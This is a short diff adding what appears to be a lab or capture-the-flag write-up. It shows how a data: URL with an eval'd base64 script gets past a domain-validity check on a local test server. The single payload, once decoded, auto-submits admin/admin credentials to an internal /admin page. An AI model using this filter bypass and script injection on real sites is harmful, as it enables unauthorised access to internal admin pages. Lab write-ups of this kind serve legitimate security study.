@@ -1,0 +1,4 @@
+Accessing Internal Pages via data stream:
+  Explanation... This bypasses a trivial check for validity of domains and external domains.
+  It's just eval-ing a base64 encoded payload to bypass the :// check that's looking for the hostname.
+    - http://172.17.0.2:5000/?l=data%3Atext%2Fhtml%2C%20%3Cscript%3Eeval(atob(%22ZG9jdW1lbnQud3JpdGUoJzxmb3JtIGlkPWZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSJodHRwOi8vbG9jYWxob3N0OjUwMDAvYWRtaW4iPjxpbnB1dCB0eXBlPWhpZGRlbiB2YWx1ZT1hZG1pbiBuYW1lPXVzZXJuYW1lPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXBhc3N3b3JkIHZhbHVlPWFkbWluPjwvZm9ybT4nKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybScpLnN1Ym1pdCgpOw%3D%3D%22));%3C%2Fscript%3Ehttps%3A%2F%2Fgoogle.com
